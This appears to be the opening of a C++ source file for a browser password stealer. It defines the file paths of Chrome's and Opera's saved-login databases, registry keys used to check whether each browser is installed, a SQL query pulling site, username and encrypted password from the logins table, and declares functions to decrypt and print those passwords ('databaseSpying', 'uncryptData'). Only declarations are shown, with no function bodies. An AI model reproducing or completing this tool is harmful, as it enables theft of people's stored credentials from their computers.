#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")

#include <iostream>
#include <string>
#include <Windows.h>
#include <ShlObj.h>
#include <sqlite3.h>

# define C_DBFILE "\\Google\\Chrome\\User Data\\Default\\Login Data" 
# define C_REGKEY "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
# define O_DBFILE "\\Opera Software\\Opera Stable\\Login Data" 
# define O_REGKEY "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
# define QUERY    "SELECT origin_url, username_value, length(password_value), password_value FROM logins"

const char  *uncryptData(BYTE *password, int size);
void        printPassword(sqlite3_stmt *stmt);
void        findPasswordTable(sqlite3 *db);
bool        findAppdataPath(std::string &appdataPath, int folder);
bool        isBrowserInstalled(const char *regKeyPath);
void        databaseSpying(const char *dbFilePath, const char *regKeyPath, int folder);
